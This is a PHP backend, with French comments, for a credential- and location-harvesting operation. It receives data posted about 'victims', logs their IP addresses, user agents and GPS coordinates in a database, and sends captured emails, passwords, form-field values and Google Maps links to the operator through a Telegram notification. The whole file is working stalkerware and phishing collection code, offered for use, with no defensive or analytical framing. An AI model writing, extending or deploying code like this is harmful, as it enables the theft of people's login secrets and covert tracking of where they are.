<?php
require_once '../config.php';

$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['victimId']) || !isset($input['type'])) {
    http_response_code(400);
    die(json_encode(['error' => 'Invalid data']));
}

$victimId = $input['victimId'];
$type = $input['type'];
$data = $input['data'];

// Vérifier si la victime existe
$stmt = $pdo->prepare("SELECT * FROM victims WHERE id = ?");
$stmt->execute([$victimId]);
$victim = $stmt->fetch();

if (!$victim) {
    // Créer si n'existe pas
    $stmt = $pdo->prepare("INSERT INTO victims (id, ip, user_agent, first_seen, last_seen) VALUES (?, ?, ?, NOW(), NOW())");
    $stmt->execute([$victimId, getClientIP(), $_SERVER['HTTP_USER_AGENT'] ?? '']);
} else {
    // Mettre à jour
    $stmt = $pdo->prepare("UPDATE victims SET last_seen = NOW() WHERE id = ?");
    $stmt->execute([$victimId]);
}

// Sauvegarder les données
$stmt = $pdo->prepare("INSERT INTO data (victim_id, type, content, timestamp) VALUES (?, ?, ?, NOW())");
$stmt->execute([$victimId, $type, json_encode($data)]);

// Traitement spécial pour la localisation
if ($type === 'location' && isset($data['lat']) && isset($data['lng'])) {
    $stmt = $pdo->prepare("INSERT INTO locations (victim_id, lat, lng, accuracy, timestamp) VALUES (?, ?, ?, ?, NOW())");
    $stmt->execute([$victimId, $data['lat'], $data['lng'], $data['accuracy'] ?? 0]);
}

// Log
logActivity("[$victimId] Donnée reçue: $type");

// Notification Telegram (si importante)
if (in_array($type, ['location', 'credentials', 'password'])) {
    $message = "📦 <b>$type</b>\n🆔 $victimId\n";
    
    if ($type === 'location') {
        $message .= "📍 Lat: {$data['lat']}\n📍 Lng: {$data['lng']}\n🎯 Précision: {$data['accuracy']}m";
        $message .= "\n🗺️ https://maps.google.com/?q={$data['lat']},{$data['lng']}";
    } elseif ($type === 'credentials') {
        $message .= "🔑 Email: {$data['email']}\n🔐 Password: {$data['password']}";
    } elseif ($type === 'password') {
        $message .= "🔐 Champ: {$data['field']}\n📝 Valeur: {$data['value']}";
    }
    
    sendToTelegram($message);
}

echo json_encode(['success' => true]);
?>
